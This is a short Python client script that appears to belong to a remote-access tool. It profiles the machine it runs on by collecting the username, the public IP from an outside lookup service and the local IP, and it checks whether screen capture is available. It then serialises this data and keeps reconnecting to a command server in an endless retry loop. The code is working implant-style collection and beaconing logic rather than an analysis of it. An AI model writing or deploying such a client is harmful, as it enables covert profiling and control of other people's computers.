import getpass, requests, socket, pickle, loguru, time
import platform

from PIL import ImageGrab
from core.handler import ServerHandler

def checkDesktopEnvironment() -> bool:
    try:
        ImageGrab.grab()
        return True

    except OSError:
        return False

deviceProfile: list[str] = [
    getpass.getuser(),                              # Username
    requests.get('https://api.ipify.org/').text,    # Public IP Address
    socket.gethostbyname(socket.gethostname())      # Local IP Address
]

additionalData: dict = {
    "Operating System": platform.platform(),
    "Desktop Environment": '0' if checkDesktopEnvironment() else '1'
}

compressedData: bytes = pickle.dumps(deviceProfile)

while True:
    try:
        s = ServerHandler(server_address = ('127.0.0.1', 3451), deviceData = compressedData, additionalData = additionalData)
        s.start()

    except (ConnectionRefusedError, ConnectionResetError):
        loguru.logger.error('Connection to the server is unreachable, an attempt will be made to reconnect')
        time.sleep(2)
